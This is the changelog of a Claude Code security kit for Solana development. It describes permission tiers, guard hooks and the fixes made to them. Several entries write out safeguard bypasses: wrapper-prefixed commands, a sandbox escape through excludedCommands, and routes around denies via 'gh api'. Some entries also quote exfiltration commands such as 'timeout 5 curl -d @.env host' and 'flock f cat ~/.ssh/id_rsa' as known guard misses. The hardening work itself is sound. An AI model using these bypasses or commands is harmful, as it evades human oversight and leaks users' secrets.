# Changelog

All notable changes to solana-ai-kit.

## [Unreleased]

Merged to `main` after the 2.3.0 bump (#168); not yet in a tagged release.

### Added
- **The gates three user-facing surfaces promised and no mechanism provided** (`RULE_SET_VERSION` 5). `docs/firewall.md`'s gate table advertised approval prompts for a family of destructive commands that nothing gated: `permissions.ask` is empty at every tier, `Bash(solana-keygen *)` and `Bash(gh *)` are in `allow`, and the only `git push` denies were the `--mirror` pair. The pre-firewall `ask` rules had been retired so Relaxed could stay CI-safe, and the replacement hooks only ever covered mainnet, publish, irreversible on-chain, secrets and egress. Now reimplemented, each by the mechanism that can actually express it:
  - **`solana-keygen new`/`recover --force` with no `-o`** is denied at every tier by `secrets-guard.sh`. It destroys `~/.config/solana/id.json`, which never appears in the command text, so the guard's argument scan could not see it — the target is implied by the *absence* of `-o`. A hook rather than a rule because no glob can express "and no `-o`": a deny on `solana-keygen new *--force*` would also stop `--force -o target/deploy/x-keypair.json`, which is how a program keypair is regenerated. A deny rather than a prompt because without the flag `solana-keygen` already refuses to overwrite, so dropping it runs the identical command wherever no wallet exists.
  - **Force push and `gh pr merge`** are gated by `egress-guard.sh`: allowed at Relaxed, ask at Medium, denied at High. This covers `--force`, `--force-with-lease`, `--force-if-includes`, `-f` and the `+refspec` form (`git push origin +main`) that a glob cannot express at all; `--dry-run`/`-n` is exempt.
  - **`npm`/`cargo publish` now asks at Relaxed** instead of being allowed, which is what README and the spec always claimed. Safe at the CI tier because `kit_ask` goes silent with no interactive user; Medium and High still deny, headless included.
  - **Recoverable history rewrites ask at High** — `git rebase`, `git commit --amend`, `git stash drop`/`clear`, `git branch -d`, `git tag -d`/`--delete`, `git filter-branch`/`filter-repo`, with `git rebase --continue`/`--abort`/`--skip` exempt so a conflict resolution is never interrupted. Named one by one so the claim is checkable.
  - **The `--receive-pack`/`--upload-pack`/`--exec` transport overrides** are denied at every tier, on `push`, `pull`, `fetch`, `clone` and `ls-remote`, each with its zero-gap twin. These name a *program* for git to run, and `git push/pull/fetch` are three of the eight `excludedCommands`, so the program would have run with the OS sandbox lifted. **`gh issue delete`** joins them: GitHub cannot undo it.
  - **`gh api` is denied at Medium and High**, closing the `gh api -X DELETE /repos/O/R` route around `gh repo delete` and the `gh api --method PUT …/secrets/NAME` route around `gh secret set`. The whole subcommand rather than the mutating methods: a glob carries no argument form, and a hook classifying the method would be one missed spelling away from a silent hole. `FIREWALL-SPEC.md` §7 item 2 recorded this as an open call; it is now narrowed at the two tiers that promise it and accepted at the two that do not. This is the **only** `Bash` deny in the corpus that varies by tier — every other one is identical at all four — and `tests/test_firewall.sh` now pins that by exact rule string and exact tier set, instead of asserting the Bash deny set never varies at all. That pin is what caught a proposal to scope `Bash(git -C *)` to High: a `-C <dir>` prefix defeats every subcommand-anchored destructive git glob (`git -C . clean -xdf` and `git -C . reflog expire --expire=now --all` both walk through, and `-C .` needs no second repository so no sandbox fence is behind it), so that rule has to stay tier-invariant and does. The reason now sits next to the rule in `firewall.sh` and in `docs/firewall.md`'s wrapper note, so it is not re-litigated as lazy breadth.
- **The gate table now names the mechanism rather than "`ask` rules"** for every prompt, since `permissions.ask` is empty at all four tiers and the prompts come from hooks. `git clean` moved to the deny row, where it had been all along — the table listed it as a prompt while it was stricter than documented.
- **A fetch-and-execute gate (`.claude/hooks/fetch-exec-guard.sh`) — FRESH INSTALLS ONLY.** It gates "download a package from the internet and run it" when the package is not already a declared project dependency: `npx`, `npm exec`/`npm x`, `pnpm dlx`, `yarn dlx`, `bunx`, `bun x`, `uvx`, `uv tool run`, `uv run --with`, `pipx run`, `cargo install`, `cargo binstall`/`cargo-binstall`, and `go run`/`go install` of a `pkg@version`. Anything in `package.json` + `node_modules/.bin/`, `Cargo.toml`/`Cargo.lock`, `go.mod` or `pyproject.toml` passes at every tier, as do commands that only build or run local code (`cargo build`, `cargo install --path .`, `go run ./...`, `pnpm exec`, `npm run`, `npx --no-install`) and prose or heredoc bodies that merely name a runner. **Off** silent, **Relaxed** reports and passes, **Medium** currently the same as Relaxed and marked UNDECIDED in the script pending an interactive test of whether a hook `ask` prompts, **High** denies. This is the only implementation route for gating `cargo install` at High: `Bash(cargo install *)` stays in `permissions.allow` at every tier, because a `PreToolUse` hook decides before the permission layer and over it — the same mechanism by which `npm publish` is already denied at Medium while `Bash(npm *)` is allowed. **`install.sh` copies `.claude/settings.json` only when absent (issue #91) and this change ships no `update.sh` migration, so existing projects do not get the `hooks` entry** — `/update` delivers the script but leaves it unregistered and inert. `/doctor`'s new check 10 reports that state and tells "this install predates the guard" apart from "removed on purpose". **High also passes the eight packages the kit's own commands invoke** — `create-solana-dapp`, `create-next-app`, `codama`, `solana-mobile`, `@colosseum-org/copilot-connect` and `@stbr/safe-ai-skill` on npm, `shank-cli` on crates.io, and `avm` from Anchor's own git repository, which no project can declare its way out of because a `--git` source is gated whatever the manifests say. Without them High would deny `/scaffold`, `/generate-idl-client` and `/doctor`'s own fix for a missing Anchor. The list is `KIT_FETCH_EXEC_ALLOW` in the guard, not in `settings.json`, precisely because `/update` ships `hooks/` and cannot rewrite that file; it is matched on the exact package name within one ecosystem, never as a prefix, substring or scope, and it changes High alone — Relaxed and Medium still report an allowlisted fetch like any other and Off stays silent, so no entry can make a fetch less visible. An allowlisted package at High is reported rather than silently run, and the note names the list it was found on. Deliberately absent: the MCP servers `/setup-mcp` offers, which the kit reaches only via `claude mcp add … -- npx …` (command word `claude`, which this guard never inspects and `Bash(claude *)` denies at every tier), and `prettier`/`playwright`/`tsc`, which are declared devDependencies wherever the kit runs them. `tests/test_fetch_exec_guard.sh` covers 272 checks across all four tiers, the MCP surface, both registration copies, a near-miss of every allowlist entry, and two mutation checks that prove those near-miss assertions can fail.
- **High denies Cloudflare's `execute` MCP tool** (`RULE_SET_VERSION` 4) — `cloudflare/mcp` exposes three tools and only `execute` mutates, reaching the whole Cloudflare write API; `docs` and `search` stay callable at every tier. High only, deliberately: `context-mode` is a default server so both gated tiers must speak for a user who never chose it, while attaching Cloudflare means creating a scoped API token, which Medium treats as an explicit choice. This is the first tool-name deny that differs between Medium and High, so `tests/test_firewall.sh` now asserts a `high -> medium` descent is byte-identical to a direct Medium apply. The hooks' matcher does not cover this server, so below High it has no pattern layer either — stated in `docs/firewall.md`, which also now records that Playwright is the one server no tier gates at all.
- **`solana-fuzz` extension** (#173) — Trident harness API and invariant patterns, pinned under `testing-qa`.
- **`sign-safe`, `counterparty-gate` and `community-moderation` extensions; `solana-airdrop` catalogued as an add-on** (#174). `counterparty-gate` calls SolSentry's hosted API, recorded in its entry's `safety` field.
- **`position-manager-skill`, `content-gen-skill` and `writer-style-skill` extensions** (#176).
- **`validate.sh` fails when the shipped `.claude/VERSION` falls inside `update.sh`'s retired-defaults migration case** — if it matched, `/update` would strip settings the user of a current install set themselves. `tests/test_validate.sh` covers both outcomes (#127).
- **Registry install commands are checked** (#177) — each `install.command` matches its declared method, an npmjs.com source names the package the command installs, and (network-gated) every npx package resolves. It caught a nonexistent `@pythnetwork/pyth-mcp` and two HTTP servers mislabelled as npx.
- **Submodule review job** (#146) — on every PR that moves an `ext/` pin, CI diffs each pack from the merge-base to the new commit and flags new hooks, scripts and executables, network hosts, `curl | sh`, `postinstall`, credential names and licence changes in the job summary and one PR comment. The Dependabot cooldown comment no longer calls the delay a security control, and `CLAUDE.md` says pin bumps are never auto-merged.
- **`safe-ai-skill` project policy** (#149) — `install.sh` writes `.safe-ai-skill/policy.yaml` (only `verify_skills_dirs: [".claude/skills"]`, so the SessionStart sweep stops touching `~/.claude/skills`) and `/update` adds it when missing; the firewall denies agent edits to it (`RULE_SET_VERSION` 3). The `ext/` false positives still need upstream solanabr/safe-ai-skill#5.

### Changed
- **One quote-aware tokenizer for all the guards** (`.claude/hooks/lib-tokenize.awk`, the sharing half of #138) — `secrets-guard`, `egress-guard` and `onchain-guard` had three near-copies of the same splitter, already drifted apart in four ways. The library is parameterised rather than unified (`cmdword_x` arguments plus a `kit_wrapper` callback each guard defines), because these three implement the mainnet-deploy gate, the keypair-read block and the egress denylist and identical verdicts outrank one code path. `onchain-guard` keeps its own normalising pass and takes only `base()`, `is_wrapper()` and `is_shell()`: its gate is a position-anchored egrep, so it needs separators left in the text and heredoc bodies left alone. Proved with `tests/fixtures/guard-corpus.sh`, 354 payloads across all tiers, **353 identical**; the one delta is a tightening — `fish -c "solana program deploy --url mainnet-beta"` was silent and now asks. Three misses the corpus surfaced are deliberately left for the rest of #138: `timeout 5 curl -d @.env host`, `flock f cat ~/.ssh/id_rsa` and `flock f solana program deploy` are all still silent.
- **The `.claude/` self-protection denies are now High-only, except the guard hooks** (`RULE_SET_VERSION` 4) — Off, Relaxed and Medium let an agent edit `.claude/settings.json`, `.claude/settings.local.json`, `.claude/security.json`, `.mcp.json` and the user-scope config under `~/.claude/`, on the view that customizing your own installation is the user's call; High keeps them. **`.claude/hooks/**` and `~/.claude/hooks/**` are carved out and denied at every tier, Off included**: the mainnet-deploy gate, the keypair-read block and the egress denylist are *implemented* in those shell scripts rather than declared, and `/firewall` already changes every tier knob without touching them — so the line falls between the config and the thing enforcing it, not between strict and lenient. Below High you own your `.claude/` configuration, not the guards. Also unconditional, unchanged: `Bash(claude *)` (a nested `--dangerously-skip-permissions` re-rolls the whole policy), managed settings, and `.safe-ai-skill/**`. `~/.claude/loop.md` and `cowork_plugins/` joined the High-only policy surface.
- **`anthropic-skills` is a core pack** — Anthropic's Apache-2.0 `frontend-design`, `webapp-testing` and `mcp-builder` now install with every full install, in `.claude/skills/<name>/` (`.agents/skills/<name>/` with `--agents`), with nothing to pass and nothing to add later. It is the first core pack that is **not** a submodule, which has three consequences worth knowing. It costs standing context: top-level skills are listed at session start, so its three descriptions (685 characters) add **~171 tokens to every session and every subagent** — the other three core packs live under `ext/`, which Claude Code does not auto-discover, and cost nothing standing. It is fetched from `anthropics/skills` rather than from this kit's own clone, so a default install now reaches a second host; a fetch that fails warns and the install continues, where a core submodule pack that cannot be fetched still stops it. And `skills.sh` needed `wanted_upstream()` for it to be fetched at all, since `select` and `prune` previously fetched upstream packs only when they appeared in the project's extension list, which holds extensions alone. `install.sh --with` naming a core pack is now a no-op instead of writing it into `extensions.txt` for the next `prune` to warn about and drop.
- **`context-mode` is a default MCP server** (#176). `update.sh`'s retired-defaults migration no longer removes it, and FIREWALL-SPEC.md now says its `ctx_execute` runs outside every rule and hook, so shipping it ends the egress guarantee unless the user removes it. Chainstack, Phantom and Nansen are opt-in servers in `/setup-mcp`.
- **`eth-to-sol` is a documented add-on, not a pinned extension** (#176) — it has no license, so vendoring it redistributed an all-rights-reserved tree.
- **README slimmed to install and orientation** (#172) — the spec (plugin route, firewall mechanism, skill-pack tables, agent and command reference, MCP catalogue) moved to `docs/`, which `install.sh` never copies into a project.
- **Default MCP servers are pinned to exact versions** (#140): `helius-mcp@2.2.0`, `@upstash/context7-mcp@4.1.1`, `context-mode@1.0.169`. `validate.sh` rejects `@latest` and unversioned `npx` servers. Existing installs keep their `.mcp.json`; re-pin by hand.
- **One build rule for deploy and verify** (#139) — `anchor build` for the IDL, then `solana-verify build` last, and deploy the `target/deploy/` binary it produces, which is what `solana-verify` / `anchor verify` reproduce. `CLAUDE-solana.md`, `/deploy`, `/build-program`, `/setup-ci-cd`, `/audit-solana`, `deployment.md` and two agents now agree.

### Fixed
- **The SessionStart banner is no longer sheared by the host's prefix** — Claude Code prints a hook's `systemMessage` after its own `SessionStart:startup says:` label, on the same line, which pushed the first row of the ASCII art out of alignment. Both hook copies (`.claude/settings.json` and `plugin/hooks/hooks.json`) now lead the banner with a blank line, and `tests/test_hooks.sh` asserts that on the raw JSON for both, since every content assertion is blind to it. **Fresh installs only**: `install.sh` copies `.claude/settings.json` just when it is absent and `/update` makes no in-place edit here, so existing projects keep the sheared banner until they replace that file by hand (#91).
- **`/firewall`'s rule count was half the real one** — the command's inline python tallied `permissions` alone, while `enforced.ruleIds` records the `sandbox` lists too, so it reported every sandbox rule as missing: 378 of 546 counted, the other 168 called absent on a repo with nothing wrong. It now runs `bash .claude/bin/firewall.sh show`, which counts every managed list and prints the re-apply remedy when `absent` is genuinely above zero.
- **`CLAUDE.md` told you to author commits with a denied command** — the attribution instruction named `git -c user.name=... user.email=...`, which every firewall tier denies as a wrapper that evades the `git <subcommand>` rules. It now names leading `GIT_AUTHOR_NAME=... GIT_AUTHOR_EMAIL=... git commit` assignments, which are deliberately left matchable.
- **The firewall no longer denies the agent's own memory** — `Edit(~/.claude/**)` was a blanket glob over the user's whole Claude Code config directory, so it also denied `~/.claude/projects/**/memory/**` (the harness's documented file-based agent memory, which failed with "File is in a directory that is denied by your permission settings") and `~/.claude/CLAUDE.md`, which `CLAUDE-solana.md` tells every user project to use for cross-project preferences — the kit forbade a documented feature and its own shipped instruction. Deny beats allow in every scope with no un-deny primitive and no specificity tiebreak, so no allow rule could carve either back out; the glob is replaced by an enumeration of the policy surface (`hooks/` at every tier; at High also `settings*.json`, `.credentials.json`, `agents/`, `commands/`, `skills/`, `rules/`, `output-styles/`, `plugins/`, `cowork_plugins/`, `workflows/`, `routines/`, `scheduled_tasks.json`, `loop.md`, `daemon.json`, `launch.json`, `shell-snapshots/`, `local/`). `~/.claude/keybindings.json`, which the `keybindings-help` skill exists to edit, was a second documented feature the glob broke. Session transcripts are a separate rule and stay read-denied at Medium and High. `tests/test_firewall.sh` now asserts effective write permission on those paths at all four tiers rather than the presence of a rule string.
- **`trident fuzz run` gets `--with-exit-code`** in `/test-rust` and `/audit-solana` (#175); without it a failing invariant exits 0.
- **Registry pins for `metaplex` and `cloudflare` synced** (`b7c9c3e`) after their gitlinks moved without `skills.sh pins --write`, which left `validate.sh` and every install-dependent suite failing on `main`.
- **CI template** (#152) — `.github/templates/claude-code.yml` installed Solana with `solana-labs/setup-solana@v1`, which 404s. It now installs Agave from release.anza.xyz and Anchor through avm at the project's `Anchor.toml` / `rust-toolchain.toml` versions, and CI resolves every `uses:` under `.github/`.
- **Deploy commands that aborted or hit the wrong account** (#139) — `verify-from-repo --remote` is replaced by `remote submit-job`, `anchor verify` passes `--current-dir` and the cluster after `--`, and legacy IDL accounts close with `anchor legacy-idl close`.
- **anthropic-skills licence gate** (#142) — the Apache-2.0 check compares the normalised licence text instead of two substrings, accepts only Anthropic's copyright line in the appendix, refuses "All rights reserved", checks nested folders, runs the denylist before the lock short-circuit, treats a `pending` lock as not installed, and the offline pin check fails unless `ALLOW_OFFLINE=1`.
- **`extensions.txt` glob expansion** (#181) — ids are quoted everywhere, and each line is trimmed, lowercased and dropped with a warning unless it is an extension id, so a `*` or a mangled line can't become a recorded pack.
- **Plugin installs have a next step for `ext/` links** (#120) — the plugin hub names the solana-dev MCP, the kit site and the registry `source` when a pack isn't there, and `test_plugin.sh` checks every `ext/` link and `skills.sh add` hint in plugin agents, commands and skills names a pack with a `source`.

## [2.3.0] - 2026-10-03

### Added
- **`auditor-skill` is a new core pack** ([solanabr/auditor-skill](https://github.com/solanabr/auditor-skill), MIT) — 20 scope-gated checklists over 1,424 verification items and 138 known attack vectors, covering Solana programs and the code around them (TypeScript, Rust services, Python, backend, frontend, supply chain, secrets, deployment, logging, privacy, AI-agent surface). `/audit-solana`, `/audit-infra`, `/diff-review` and the Anchor and Pinocchio agents now read it.
- **Every pinned pack records its commit in `skill-registry.json`** — previously only `anthropic-skills` did; the other 20 were pinned by the gitlink alone, which does not survive into a user project (ext/ packs are vendored and their gitfiles stripped). Both kinds now use the same `commit` field, and both are verified rather than trusted: an upstream pack's fetch asserts `FETCH_HEAD`, and a submodule pack's gitlink is checked before `install.sh` or `skills.sh add` copies it. A mismatch stops the install and names the fix.
- **`bash .claude/bin/skills.sh pins`** — compares every registry pin with its gitlink; `--write` rewrites the registry from the gitlinks. `validate.sh` runs the read-only form, so the registry cannot drift from `.gitmodules` silently.
- **`.github/workflows/sync-skill-pins.yml`** — Dependabot can only move a gitlink, so this job rewrites the registry on its weekly bump branch and pushes it, keeping the new check from turning every bump PR red. It uses `workflow_run` (a Dependabot-triggered run gets a read-only token and cannot push), takes `skills.sh` from the default branch, and refuses a branch that changed anything but submodule pins.
- **A pack's own submodule pins are recorded** in the entry's `vendored` field and checked by `validate.sh`, so a third party moving a pin inside a pack the kit ships fails CI until someone reads the diff. Not auto-synced, deliberately.
- **`/resync` reports the registry pins it leaves behind** (#168) — it moves packs to upstream latest on purpose, so it names the packs that moved and the `skills.sh pins --write` that closes the gap before `validate.sh` fails on it.
- **`bash .claude/bin/skills.sh add --force`** (#131) reinstalls a partially installed pack, and kit packs are copied atomically, so an interrupted add no longer leaves a pack `add` refuses to repair.
- **`skills.sh list` and `skills.sh add` run without a prompt** (#150), so agents can install an extension pack before linking into it; `prune`, `select` and `uninstalled` still prompt. `firewall.sh` generates the two rules (ALLOW, every tier), and `validate.sh` now fails if the committed `settings.json` differs from what `firewall.sh` generates for the declared tier.

### Changed
- **`colosseum` is now a core pack**, re-pinned to Copilot 2.0.1. Its auth is no longer a PAT: it signs in through `npx @colosseum-org/copilot-connect login` (Node 20+, `--device` where no browser can open; `status`/`logout`/`revoke` alongside), which keeps the credential in the OS store. `COLOSSEUM_COPILOT_PAT` and `COLOSSEUM_COPILOT_API_BASE` are gone from `.env.example` and `/setup-mcp` — v1 tokens stop working 2026-10-28. It is the only non-open-source pack installed by default (README: Copyright Colosseum, no LICENSE file), recorded as such in the registry and the README row. The installer's closing box and `/doctor` check 5 both surface the sign-in, since the installer cannot perform it.
- **The installers no longer recurse into a pack's own submodules** (`--recursive` dropped for pack paths in `install.sh` and `skills.sh`). Those pins belong to the pack's author, and since the install *vendors* what it fetches, recursing copied a third-party tree into user projects at a commit nobody here recorded: `auditor-skill` → `trailofbits` (CC-BY-SA-4.0, into an MIT project) and `solana-game` → a second `solana-dev` at a different commit. Both packs test for the directory and fall back when it is absent.
- **`install.sh` fetches only the skill packs it keeps** (#134), instead of downloading every pack and then pruning to the core tier.
- **`metaplex` and `cloudflare` re-pinned** (`f8d5cc4`); the metaplex upstream had corrected four facts the kit was still shipping.

### Fixed
- **A wrapper in front of a gated command bypassed the secrets and on-chain gates** (#138). Both gates now share one PreToolUse hook that splits the command like `sh` (unquoted `;` `&&` `||` `|` `&` and newlines, quotes, heredocs, `$(...)`), strips `VAR=` assignments and wrappers (`env`, `xargs`, `nohup`, `time`, `sudo`, absolute paths), re-parses `sh -c`, `bash -c` and `eval` payloads, and treats heredoc bodies, `echo`/`printf` arguments, grep patterns and git/gh messages as data. A command it cannot parse gets an approval prompt. The allow list drops `env *`, `xargs *` and `command *`. FIREWALL-SPEC.md no longer says those wrappers need no defence (`a20419e`).
- **Every session raised macOS's privacy prompt for users with a password manager** (`e808764`, `164e688`). Resolving the keychain and 1Password group-container denies touched another app's data; macOS already gates those for every process, so the denies are gone. Bitwarden's Application Support directory is unsandboxed and stays denied.
- **`skills.sh` ignored a registry it could not parse and never pruned packs the kit dropped** (#136).
- **Stale registry entries** (#135): `meteora-sdk-skill` → `MeteoraAg/meteora-invent`, `get-shit-done` marked archived, the `emilkowalski/skills` rename followed, seven placeholder `last_commit` rows refreshed, and qedgen's `ARISTOTLE_API_KEY` added to `.env.example`.
- **The SessionStart banner shows the cluster and wallet to the user again** (#144): the RPC host with its API key stripped and the wallet, or "Solana CLI not found on PATH." Same in the plugin hook.
- **token-extensions** (#147): mint space calculation, CLI multisig scope, a linked-file contradiction and the memo v4 note.
- **Ripple Map rows point at the files that hold the counts**, and every kit link is checked (#148).
- **`install.sh` stripped the only content under `## Project Learnings`** (#153, root cause of #104); installed instruction files now keep its subsections, and `/dream` and `/diff-review` write to them (#155).
- **The marketplace entry** gains `license`, `homepage` and `keywords` and drops `strict` and the component counts (#154).

### Removed
- **`trailofbits`, `ghostsecurity`, `defending-code` and `safe-solana-builder`** — `auditor-skill` covers all four, and every agent, command and hub route that read them now reads it. `safe-solana-builder` was the only pack the kit ever pinned from a personal account, with no LICENSE file and no commit in 165 days; its own registry entry said to recheck the core tier if it stayed inactive.
- **The dead `rules` entries** in the install and update copy loops (#143); the kit ships no rules.

## [2.2.0] - 2026-10-02

### Added
- **Agentic firewall with four tiers** — `Off / Relaxed / Medium / High`, default **Relaxed**, gating file access, destructive commands and egress. The tier is recorded in `.claude/security.json` together with the exact rule strings written (`enforced.ruleIds`) and a hash; `.claude/bin/firewall.sh` regenerates the `permissions` + `sandbox` block in `.claude/settings.json` **wholesale** on every switch. Lists merge and never override across settings sources (effective policy is `deny = ∪denies`, `ask = ∪asks − deny`, `allow = ∪allows − deny − ask`), so a layered tier system would collapse to the strictest tier any layer ever wrote; whole-block regeneration is the only way a tier can be *lowered*. Tier-varying path decisions live in `sandbox.filesystem.denyRead`/`allowRead`, the one layer in Claude Code with a genuine carve-out (narrowness decides, not source order, so it survives merging).
- **`/firewall` command** — show the current tier and switch between them.
- **Egress guard hook** — a position-anchored PreToolUse gate for data-carrying `curl`/`wget`. It reads argument *positions*, not command prose, so `--upload-file`/`@file` bodies and reader→network-sink pipelines are caught while documentation, commit messages and issue bodies that merely *name* a credential path are not.
- **`permissions.deny` is identical at every tier** — the never-allowed set: credential stores and vaults, code-execution-on-next-build files (`~/.cargo/config.toml`, `~/.zshenv`, `~/.gitconfig`, in-project `**/.cargo/config.toml`), login-shell and autostart persistence, shell/REPL history, the kit's own settings and hooks (as `Edit(...)`, not `Read(...)`, so the kit can still read its own config), `Bash(claude *)` policy re-roll, and matcher-evading wrappers (`env`, `sh -c`, `git -c`, `git -C`, `flock`, `docker exec`, …). Deny is the one axis where merge-monotonicity is harmless, because every tier agrees.
- **Tier migration in `update.sh`** — existing installs now receive the firewall. An install whose `permissions` block still matches the shipped baseline adopts `relaxed`; one with a hand-edited policy adopts `off` and prints a notice rather than silently rewriting a tuned policy; a symlinked `settings.json` is reported `[skipped]`.
- **`tests/test_firewall.sh` and `tests/test_egress_guard.sh`**, plus four `validate.sh` checks (`security.json` validity and tier range, `enforced.ruleIds` ⊆ the live lists, generator idempotency and tier round-trip, and a rejection of `/`-anchored path rules in anything destined for `~/.claude/`, where `/secrets/**` resolves to `~/.claude/secrets/**` rather than the project).
- **Core and extension skill packs** — a full install ships only the core packs (`solana-dev`, `safe-solana-builder`); the other `ext/` packs stay pinned and install on demand with `install.sh --with <id>`, `bash .claude/bin/skills.sh add <id>` or the new `/add-skill` command (command count 30 → 31). `skill-registry.json` gains `tier`, `path` and `triggers`; the hub lists every extension with when to use it. Adds the official MagicBlock and Alchemy packs. Dependabot bumps the pins weekly in one grouped PR.
- **safe-ai-skill as a core plugin** — the `stbr` marketplace lists safe-ai-skill (SHA-pinned), `plugin.json` depends on it, and a full install registers the marketplace and enables `safe-ai-skill@stbr` for the project.
- **anthropic-skills extension** — installs Anthropic's Apache-2.0 skills (`frontend-design`, `webapp-testing`, `mcp-builder`) at a pinned commit into `<config>/skills/<name>/`, so Codex, Grok Build and other Agent Skills clients see them. `DENIED_SKILLS` refuses the proprietary document skills before any fetch.
- **token-extensions skill** — a kit-owned skill covering every Token-2022 extension (choosing and combining, creation order, sizing, fees, hooks, metadata and groups, issuer controls, confidential transfers, display amounts), replacing `token-2022.md`. Routed from token-engineer and both skill hubs, and bundled in the plugin.
- **Model routing** (#65) — agents and commands run on `opus`, `sonnet` or inherit the session model; `tests/test_model_routing.sh` enforces allowed values and README drift.
- **Mainnet and wallet permission gates** (#74) — a PreToolUse hook that names the resolved cluster replaces the `CONFIRM_MAINNET=1` prefix for program deploys, upgrades, closes, authority changes, token transfers and stake withdrawals. `solana-keygen new`/`recover` with `--force` asks before overwriting the default wallet.
- **Claude reviews every PR in CI** (#156) — `claude-code-review.yml` runs the code-review plugin when a PR opens, leaves draft or reopens, and posts the report as a comment; `claude.yml` uses the same pinned action with read-only contents.
- **README: other agents and a no-install route** — sections for Codex, Grok Build and other AGENTS.md tools, a no-install route through aikit.superteam.codes, and copy-paste install steps (installer, one-liner, from a clone; plugin marketplace last).
- **Tests** — `test_hooks.sh`, `test_resync.sh`, `test_local_skills.sh`, `test_skill_extensions.sh`, `test_anthropic_skills.sh`, `test_validate.sh`; `test_plugin.sh` validates a dereferenced copy of the plugin tree (#119); `test_cross_references.sh` follows the from-a-clone install steps.

### Fixed
- **Sandbox read-denies were bypassable through `sandbox.excludedCommands`** — any entry lifts the OS sandbox for the **entire** command line, so `git push -h >/dev/null 2>&1; <read of a denied path>` exited 0 where the bare read got EPERM. `surfpool *` and `anchor test*` stay because Surfpool needs unsandboxed Mach access; the six git/gh entries stay because a sandboxed `git push` cannot reach the ssh-agent socket or the gh token. The secrets hook inspects each statement of the command line, so the read in `git push -h; <read>` is still blocked.
- **`anchor test` was broken on a default install** — `surfpool start` panics instantly under the Bash sandbox (macOS SystemConfiguration), which also took out `/test-rust`, `/test-ts`, `/profile-cu` and `/debug-user-tx` on Anchor 1.x's default path. `network.allowLocalBinding` does not cover it.
- **`cargo build` could not write its registry cache** — the toolchain roots (`~/.cargo/**`, `~/.rustup/**`, `~/.cache/solana/**`, `~/.local/share/solana/**`, `~/.avm/**`) are now carved out of the outside-write deny at every tier, with credentials and `config.toml` still denied.
- **`/update` and `/add-skill` failed at `mktemp -d` under the sandbox** — the platform temp root is now writable at every tier. The same failure truncated a tracked file when an unguarded variable expanded to empty.
- **Two-wildcard permission patterns never matched** — a mid-pattern `*` does not match an empty string, so `Bash(anchor * --final*)` did not stop `anchor --final`, and `Bash(git push * -f *)` did not stop `git push origin -f`. Every two-wildcard rule now ships its zero-gap twin.
- **`permissions.ask` rules never fired** — verified twice in-session: `git clean -n` matched an ask rule and ran silently while a deny rule blocked `sudo -n true`, with the sandbox on. Every prompt is now a hook returning `permissionDecision: "ask"`; no tier distinction rests on `permissions.ask`.
- **`Bash(git clean -fd *)` and `Bash(git push --force *)` sat in both `deny` and `ask`** — deny wins, so both ask rules were dead. The lists are de-duplicated and a test forbids any pattern appearing in both.
- **The secrets hook matched command prose instead of argument positions** — it blocked a diagnostic `ls -l` on a wallet path, a `gh issue create` whose body mentioned `--final`, and heredocs that merely named a credential directory. Because the workaround for a false positive was identical to the workaround for a true positive, it taught evasion; two commands already documented the route-around.
- **The on-chain hook resolved the wrong cluster** with `ANCHOR_PROVIDER_URL=` set or `-C`/`--config` passed, mislabelling mainnet as devnet and vice versa. It is also headless-aware now, instead of returning `ask` for every on-chain write on every cluster and hard-failing every `-p` run.
- **Rules that protected nothing** — `Read(**/Local Extension Settings/**)` is cwd-bounded while browser profiles live under `~/Library`, so it never matched; mainnet denies anchored to the cluster string blocked read-only `anchor verify --provider.cluster mainnet` and `solana program dump --url mainnet-beta`, and now anchor to the verb.
- **Verified-live git and CLI evasions closed** — `git clean -xdf`, `git reset --ha HEAD` (long options abbreviate in git), `git restore .` (absent from the policy entirely), `git branch --delete --force`, `git gc --prune=all`, `git push origin +main`, `solana config set -k /path`, `npm run release` wrapping `npm publish`, `gh api -X DELETE /repos/O/R`, and `gh variable set`.
- **anchor-engineer's "one `#[error_code]` enum" rule was wrong** (#129) — replaced with the real check: each enum's codes are `offset` plus each variant's discriminant, and two enums whose ranges overlap cannot be told apart.
- **`/test-and-fix`, `/test-rust` and `/test-ts` decoded Anchor error ids by declaration order** (#133); they now use offset plus discriminant.
- **`.gitmodules` URLs for `quicknode-anchor` and `solana-mobile`** point at the renamed repos (#130), and `test_skill_extensions.sh` checks every `.gitmodules` URL against the registry source.
- `/resync` and `/update` work in `--agents` installs; `/resync` no longer reports links into uninstalled extensions as broken; `resync.sh` runs from its target dir regardless of cwd.
- install and update no longer fail when a config subdir is a symlink.
- `update.sh --dry-run` no longer deletes `.agents/commands/cleanup.md`; `install.sh --agents` removes a `/cleanup` an older install left behind.
- The `.gitignore` config block is backfilled in both install orders, without duplicates on CRLF files.
- The manual install clones into `solana-ai-kit/`, so its `cp` steps find the files.
- `validate.sh` skips, rather than fails, links into uninitialized submodules.
- Destructive-command deny rules restored; the mainnet deploy deny rule dropped so `/deploy`'s mainnet step gets the approval prompt.
- `plugin.json` no longer declares a redundant hooks path (duplicate load error).
- Anchor TS package is `@anchor-lang/core`; `anchor-specialist` references point to `anchor-engineer`; `settings.json` syntax error fixed; `/setup-mcp` covers every `.env.example` key.

### Changed
- **The Solana config directory is never added to `sandbox.filesystem.denyRead`** — only `*.json` under it. `anchor init` writes `wallet = "~/.config/solana/id.json"` into `Anchor.toml`, `Read` denies project into `denyRead`, and the sandbox covers Bash *and its children*, so a directory-wide read deny left `solana`/`anchor` unable to resolve a signer at all. `cli/config.yml` stays readable so `solana config get` keeps working.
- **Project keypairs stay `allow` at Medium**, correcting the approved matrix — Medium asking for the file High allows made Medium stricter than High on exactly that file. The control is a `Read` deny plus a sandbox `allowRead`, which blocks the model while letting the subprocess read.
- **Project `.env` write is `deny` at Medium, not `ask`** — an ask is walked around by `python3 -c`, `perl -pi` or `sed -i`, nothing in a Solana build legitimately rewrites it, and the deny removes a headless hard-fail. `/setup-mcp`, `/cleanup`, `/build-app` and `/doctor` were rewritten to a names-and-presence helper, which also resolves the safe-ai-skill `secret_read` hard-guard conflict.
- **Unrecoverable git is `deny` at every tier including Relaxed** — `git reflog expire --expire=now --all` and `git gc --prune=all` are what make history truly unrecoverable; everything else is reflog-recoverable.
- **Relaxed emits zero `permissions.ask` entries**, which keeps it CI-safe. Medium and High hard-fail headless by design; `.github/workflows/claude.yml` runs Relaxed or Off.
- **Writes under `git rev-parse --git-common-dir` are allowed** so submodule init survives a linked worktree.
